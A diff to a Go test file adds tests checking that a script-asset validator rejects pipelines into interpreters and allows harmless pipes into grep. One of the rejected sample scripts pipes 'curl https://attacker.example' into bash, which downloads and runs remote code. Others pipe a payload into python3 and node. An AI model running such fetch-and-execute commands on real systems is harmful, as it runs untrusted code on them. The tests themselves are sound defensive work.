@@ -272,6 +272,26 @@ func TestValidateScriptAssetAllowsSystemOwnedInputRedirection(t *testing.T) {
 	}
 }
 
+func TestValidateScriptAssetRejectsInterpreterPipelines(t *testing.T) {
+	for _, script := range []string{
+		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /bin/bash\n",
+		"#!/bin/bash\n/usr/bin/printf payload | command /usr/bin/env SAFE=1 python3\n",
+		"#!/bin/bash\n/usr/bin/printf payload | { /usr/bin/node; }\n",
+	} {
+		if err := validateScriptAsset([]byte(script)); err == nil ||
+			!strings.Contains(err.Error(), "interpreter pipeline") {
+			t.Fatalf("validateScriptAsset(%q) error = %v, want interpreter-pipeline rejection", script, err)
+		}
+	}
+}
+
+func TestValidateScriptAssetAllowsNonInterpreterPipeline(t *testing.T) {
+	const script = "#!/bin/bash\n/usr/bin/printf data | /usr/bin/grep data\n"
+	if err := validateScriptAsset([]byte(script)); err != nil {
+		t.Fatalf("validateScriptAsset() error = %v, want non-interpreter pipeline allowance", err)
+	}
+}
+
 func TestTrustedHookAssetsRejectExecutableSearchPathMutation(t *testing.T) {
 	for _, script := range []string{
 		"#!/bin/sh\nexport PATH=.; helper\n",
